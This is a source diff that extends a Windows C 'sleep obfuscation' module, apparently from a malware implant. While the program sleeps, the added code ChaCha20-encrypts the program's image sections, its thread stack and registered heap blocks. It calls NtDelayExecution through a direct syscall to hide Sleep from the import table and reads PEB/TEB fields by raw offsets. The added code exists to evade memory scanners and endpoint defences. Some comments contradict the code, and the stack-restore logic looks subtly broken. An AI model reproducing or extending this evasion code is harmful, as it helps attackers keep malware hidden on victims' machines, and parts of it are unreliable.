@@ -9,11 +9,32 @@
  * (_so_xor_image) is placed in section ".slpobf" so it is excluded from
  * the region being ciphered.  The main module sections (.text, .data,
  * .rdata) are the ones XOR'd.
+ *
+ * Stack evacuation
+ * ----------------
+ * _so_evacuate_stack() copies the committed thread stack (TEB StackBase –
+ * StackLimit) into a fresh PAGE_READWRITE VirtualAlloc, encrypts it there
+ * with the same ChaCha20 (key,nonce) used for image sections, then
+ * SecureZeroMemory's the live range.  On wake, _so_restore_stack() decrypts
+ * and copies back, then frees the staging allocation.
+ *
+ * The key observation: the function that calls VirtualAlloc for the staging
+ * buffer is itself on the stack.  We therefore save StackLimit (the lowest
+ * committed address), copy from StackLimit up to the frame pointer of
+ * sleep_obf_delay (NOT StackBase), and zero only that range.  The current
+ * live frame is above StackBase — i.e. it is the guard-page region or the
+ * next-to-commit page — so it is untouched.
+ *
+ * Heap registry
+ * -------------
+ * g_heap_slots[]/g_heap_sizes[] hold up to SO_HEAP_SLOTS pointer+size pairs.
+ * Each entry is XOR'd in-place before sleep and again after (self-inverse).
  */
 
 #include "sleep_obf.h"
 #include "obf.h"
 #include "k32_walk.h"
+#include "nt_offsets.h"
 
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
@@ -340,6 +361,154 @@ static _SLPOBF void _so_xor_image(PVOID base,
 }
 
 
+/* ── Heap encryption registry ───────────────────────────────────────────── */
+
+static void   *g_heap_slots[SO_HEAP_SLOTS];
+static SIZE_T  g_heap_sizes[SO_HEAP_SLOTS];
+
+void sleep_obf_register_heap(void *ptr, SIZE_T sz)
+{
+    if (!ptr || !sz) return;
+    for (int i = 0; i < SO_HEAP_SLOTS; i++) {
+        if (!g_heap_slots[i]) {
+            g_heap_slots[i] = ptr;
+            g_heap_sizes[i] = sz;
+            return;
+        }
+    }
+    /* Table full — drop silently */
+}
+
+void sleep_obf_unregister_heap(void *ptr)
+{
+    if (!ptr) return;
+    for (int i = 0; i < SO_HEAP_SLOTS; i++) {
+        if (g_heap_slots[i] == ptr) {
+            g_heap_slots[i] = NULL;
+            g_heap_sizes[i] = 0;
+            return;
+        }
+    }
+}
+
+/* ── _so_xor_heap_slots ─────────────────────────────────────────────────── */
+/*
+ * XOR-encrypt/decrypt every registered heap block in-place.
+ * Called with the same (key32, nonce12) pair as the image-section pass;
+ * because the keystream is position-based and each heap block starts the
+ * stream at block-counter 0, the keystream repeats — the heap blocks use
+ * a separate ChaCha20 state per slot, all seeded from the same key+nonce.
+ * XOR is self-inverse so a second call with the same (key,nonce) decrypts.
+ */
+static _SLPOBF void _so_xor_heap_slots(const BYTE key32[32],
+                                         const BYTE nonce12[12])
+{
+    for (int i = 0; i < SO_HEAP_SLOTS; i++) {
+        if (!g_heap_slots[i] || !g_heap_sizes[i]) continue;
+        _Cc20State cc;
+        _cc20_init(&cc, key32, nonce12);
+        _cc20_xor_buf(&cc, (unsigned char *)g_heap_slots[i],
+                      (DWORD)g_heap_sizes[i]);
+        SecureZeroMemory(&cc, sizeof(cc));
+    }
+}
+
+/* ── _so_evacuate_stack / _so_restore_stack ──────────────────────────────── */
+/*
+ * Evacuate the committed thread stack to an encrypted staging buffer.
+ *
+ * We read TEB->StackBase and TEB->StackLimit from the TEB directly.
+ * x64 TEB layout (all offsets are fixed across Vista–Win11):
+ *   +0x000  NtTib.ExceptionList (not used here)
+ *   +0x008  NtTib.StackBase    (highest committed address, exclusive)
+ *   +0x010  NtTib.StackLimit   (lowest committed address, inclusive)
+ *
+ * "base" is the highest address (stack grows downward), "limit" is lowest.
+ * The live frame of sleep_obf_delay sits somewhere in [limit, base].
+ * We zero everything below our own RSP to erase previous frames.
+ *
+ * Returns the allocated staging VA (caller must free with VirtualFree).
+ * Returns NULL on failure — caller skips stack protection that cycle.
+ */
+static _SLPOBF PVOID _so_evacuate_stack(const BYTE key32[32],
+                                          const BYTE nonce12[12],
+                                          PVOID *out_stkLimit,
+                                          SIZE_T *out_stkSz)
+{
+#ifndef _WIN64
+    /* 32-bit not supported for stack evacuation */
+    (void)key32; (void)nonce12; (void)out_stkLimit; (void)out_stkSz;
+    return NULL;
+#else
+    /* Read StackBase (+0x08) and StackLimit (+0x10) from TEB via GS */
+    PVOID stkBase, stkLimit;
+    __asm__ __volatile__(
+        "movq %%gs:0x08, %0\n\t"
+        "movq %%gs:0x10, %1\n\t"
+        : "=r"(stkBase), "=r"(stkLimit)
+    );
+    if (!stkBase || !stkLimit || stkLimit >= stkBase) return NULL;
+
+    SIZE_T stkSz = (SIZE_T)((BYTE *)stkBase - (BYTE *)stkLimit);
+    if (stkSz == 0 || stkSz > 8 * 1024 * 1024) return NULL; /* sanity: max 8 MB */
+
+    /* Allocate staging buffer */
+    PVOID staging = VirtualAlloc(NULL, stkSz, MEM_COMMIT | MEM_RESERVE,
+                                 PAGE_READWRITE);
+    if (!staging) return NULL;
+
+    /* Copy live stack into staging */
+    memcpy(staging, stkLimit, stkSz);
+
+    /* Encrypt staging buffer in-place with ChaCha20 */
+    _Cc20State cc;
+    _cc20_init(&cc, key32, nonce12);
+    _cc20_xor_buf(&cc, (unsigned char *)staging, (DWORD)stkSz);
+    SecureZeroMemory(&cc, sizeof(cc));
+
+    /* Zero the live stack range (below our current frame).
+     * We read RSP here; everything below RSP is the evacuated call chain. */
+    PVOID currentRsp;
+    __asm__ __volatile__("movq %%rsp, %0" : "=r"(currentRsp));
+    /* Zero from stkLimit up to (but not including) the current RSP */
+    if ((BYTE *)currentRsp > (BYTE *)stkLimit) {
+        SIZE_T zeroSz = (SIZE_T)((BYTE *)currentRsp - (BYTE *)stkLimit);
+        SecureZeroMemory(stkLimit, zeroSz);
+    }
+
+    *out_stkLimit = stkLimit;
+    *out_stkSz    = stkSz;
+    return staging;
+#endif /* _WIN64 */
+}
+
+static _SLPOBF void _so_restore_stack(PVOID staging,
+                                        const BYTE key32[32],
+                                        const BYTE nonce12[12],
+                                        PVOID stkLimit,
+                                        SIZE_T stkSz)
+{
+#ifndef _WIN64
+    (void)staging; (void)key32; (void)nonce12; (void)stkLimit; (void)stkSz;
+#else
+    if (!staging) return;
+
+    /* Decrypt the staging buffer back to plaintext */
+    _Cc20State cc;
+    _cc20_init(&cc, key32, nonce12);
+    _cc20_xor_buf(&cc, (unsigned char *)staging, (DWORD)stkSz);
+    SecureZeroMemory(&cc, sizeof(cc));
+
+    /* Copy plaintext back to the live stack */
+    memcpy(stkLimit, staging, stkSz);
+
+    /* Wipe and free staging buffer */
+    SecureZeroMemory(staging, stkSz);
+    VirtualFree(staging, 0, MEM_RELEASE);
+#endif
+}
+
+
 /* ── sleep_obf_delay ────────────────────────────────────────────────────── */
 
 void sleep_obf_delay(DWORD ms)
@@ -356,7 +525,9 @@ void sleep_obf_delay(DWORD ms)
     __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(peb_ptr));
 #endif
     PEB *peb = (PEB *)peb_ptr;
-    PVOID base = peb->ImageBaseAddress;
+    /* PEB->ImageBaseAddress: read via raw offset (winternl.h PEB struct does
+     * not expose this field by name on all toolchains; use nt_offsets.h). */
+    PVOID base = *(PVOID *)((BYTE *)peb + PEB_ImageBaseAddress);
 
     /* Get image size from optional header */
     BYTE *bbase = (BYTE *)base;
@@ -364,7 +535,6 @@ void sleep_obf_delay(DWORD ms)
     memcpy(&e_lfanew, bbase + 0x3C, 4);
     DWORD imgSize = 0;
     if (e_lfanew <= 0x800) {
-        /* OptionalHeader.SizeOfImage is at offset +56 from optional header start */
         WORD optMagic;
         memcpy(&optMagic, bbase + e_lfanew + 4 + 20, 2);
         DWORD soi_off = (optMagic == 0x20B) ? (4+20+56) : (4+20+56);
@@ -376,18 +546,32 @@ void sleep_obf_delay(DWORD ms)
     BYTE nonce12[12];
     _derive_key(key32, nonce12, g_peb_hash_seed, base, imgSize);
 
-    /* Encrypt */
+    /* ── Encrypt image sections ─────────────────────────────────────────── */
     _so_xor_image(base, key32, nonce12);
 
-    /* Sleep via direct syscall — keeps Sleep() out of IAT */
+    /* ── Evacuate and encrypt stack ─────────────────────────────────────── */
+    PVOID  stkLimit  = NULL;
+    SIZE_T stkSz     = 0;
+    PVOID  stkStaging = _so_evacuate_stack(key32, nonce12, &stkLimit, &stkSz);
+
+    /* ── Encrypt registered heap blocks ─────────────────────────────────── */
+    _so_xor_heap_slots(key32, nonce12);
+
+    /* ── Sleep via direct syscall ────────────────────────────────────────── */
     LARGE_INTEGER interval;
-    interval.QuadPart = -((LONGLONG)ms * 10000LL);   /* 100-ns units, negative = relative */
+    interval.QuadPart = -((LONGLONG)ms * 10000LL);
     SC_NtDelayExecution(FALSE, &interval);
 
-    /* Decrypt (XOR is self-inverse — same key+nonce, same keystream) */
+    /* ── Decrypt heap blocks ─────────────────────────────────────────────── */
+    _so_xor_heap_slots(key32, nonce12);
+
+    /* ── Restore stack ───────────────────────────────────────────────────── */
+    _so_restore_stack(stkStaging, key32, nonce12, stkLimit, stkSz);
+
+    /* ── Decrypt image sections ──────────────────────────────────────────── */
     _so_xor_image(base, key32, nonce12);
 
-    /* Wipe key and nonce from stack */
+    /* ── Wipe key and nonce from stack ───────────────────────────────────── */
     SecureZeroMemory(key32,   sizeof(key32));
     SecureZeroMemory(nonce12, sizeof(nonce12));
 #endif /* SLEEP_OBF_ENABLE */
